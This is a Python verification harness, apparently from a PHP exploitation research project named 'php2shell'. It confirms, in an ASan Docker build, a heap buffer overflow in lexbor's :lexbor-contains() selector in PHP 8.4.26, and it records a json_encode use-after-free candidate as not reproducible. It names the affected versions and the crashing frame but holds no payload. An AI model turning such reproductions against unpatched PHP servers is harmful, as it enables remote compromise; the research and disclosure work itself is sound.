#!/usr/bin/env python3
"""verify_lexbor_contains_overflow.py - green harness for the lexbor
:lexbor-contains() CSS-selector heap buffer overflow (pseudo_state.c; NET-NEW,
distinct from CVE-2026-109618/109619), reached via
Dom\\HTMLDocument::querySelectorAll(). Asserts a large argument trips an ASan
heap-buffer-overflow in the lxb_css_selectors_state_pseudo_class_function_lexbor_contains
frame while a short (<=15B) argument stays clean; VULN 8.4.26/8.5.11, FIXED 8.5.12.

Usage (builds/reuses the php2shell-lexbor-asan ASan image from lab/lexbor/Dockerfile):
  python3 -I poc/bugs/verify_lexbor_contains_overflow.py
"""
import subprocess, sys, os, pathlib

IMAGE = "php2shell-lexbor-asan:latest"
ROOT = pathlib.Path(__file__).resolve().parent.parent.parent
LAB = ROOT / "lab" / "lexbor"
ASAN_SIG = "AddressSanitizer: heap-buffer-overflow"
FRAME_SIG = "lxb_css_selectors_state_pseudo_class_function_lexbor_contains"

_POC_ROOT = str(pathlib.Path(__file__).resolve().parents[1])  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.asan_diff import has_uaf  # noqa: E402


def ensure_image():
    r = subprocess.run(["docker", "images", "-q", IMAGE],
                       capture_output=True, text=True)
    if r.stdout.strip():
        return
    print(f"[*] building {IMAGE} (ASan PHP 8.4.26 + ext/dom/lexbor) ...")
    b = subprocess.run(
        ["docker", "build", "-f", str(LAB / "Dockerfile"), "-t", IMAGE, str(ROOT)],
        text=True)
    if b.returncode != 0:
        print("[-] image build failed"); sys.exit(2)


def run_php(php_file, *args, timeout=120, tracked=True):
    """Run a .php from lab/lexbor inside the ASan container; return combined output.

    tracked=True (USE_TRACKED_ALLOC=1) defers efree() to shutdown -> good for
    spatial overflow detection (lexbor), but hides temporal UAFs. For UAF probes
    use tracked=False so efree()->free() poisons immediately.
    """
    env = ["-e", "ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:exitcode=99",
           "-e", "USE_ZEND_ALLOC=0"]
    if tracked:
        env += ["-e", "USE_TRACKED_ALLOC=1"]
    cmd = ["docker", "run", "--rm", "-v", f"{LAB}:/work:ro", *env,
           IMAGE, "php", "-n", f"/work/{php_file}", *map(str, args)]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    return p.returncode, (p.stdout or "") + (p.stderr or "")


def main():
    ensure_image()
    ok = True

    # 1) Overflow: large argument -> ASan heap-buffer-overflow in lexbor_contains.
    print("[*] lexbor-contains(): large (16384B) argument ...")
    rc, out = run_php("lexbor_overflow.php", 16384)
    hit = has_uaf(out, frame=FRAME_SIG)
    print(f"    rc={rc} asan_overflow={ASAN_SIG in out} in_lexbor_contains={FRAME_SIG in out}")
    if hit:
        for line in out.splitlines():
            if ASAN_SIG in line or ("pseudo_state.c" in line and FRAME_SIG in line):
                print("    | " + line.strip())
    else:
        print("    [-] expected ASan overflow NOT observed"); ok = False

    # 2) Boundary control: short argument (12B, fits 16B slot) -> no overflow.
    print("[*] lexbor-contains(): short (12B) argument (control) ...")
    rc2, out2 = run_php("lexbor_overflow.php", 12)
    clean = ASAN_SIG not in out2
    print(f"    rc={rc2} no_overflow={clean}")
    if not clean:
        print("    [-] control unexpectedly overflowed"); ok = False

    # 3) json_encode() live-props resize UAF candidate (side-check, not gating).
    #    Run with immediate frees (tracked=False) so a real temporal UAF would
    #    poison. It does NOT: zend_get_properties_for(ZEND_PROP_PURPOSE_JSON) does
    #    GC_TRY_ADDREF on the properties table, so the in-callback property add
    #    copy-on-write SEPARATES a fresh table; json iterates the untouched
    #    original (freed only after the loop).
    print("[*] json_encode() live-properties resize UAF candidate (immediate-free) ...")
    rc3, out3 = run_php("json_resize_uaf.php", tracked=False)
    uaf = "AddressSanitizer: heap-use-after-free" in out3
    print(f"    rc={rc3} heap_use_after_free={uaf}")
    verdict = ("CONFIRMED (UAF-read)" if uaf
               else "NOT-REPRO (COW-separated via GC_TRY_ADDREF; not a bug)")
    print(f"    json_encode UAF: {verdict}")

    print()
    if ok:
        print("[+] PASS: lexbor :lexbor-contains() heap buffer overflow CONFIRMED on our 8.4.26 ASan stack")
        print(f"    json_encode UAF side-result: {verdict}")
        sys.exit(0)
    print("[-] FAIL")
    sys.exit(1)


if __name__ == "__main__":
    main()
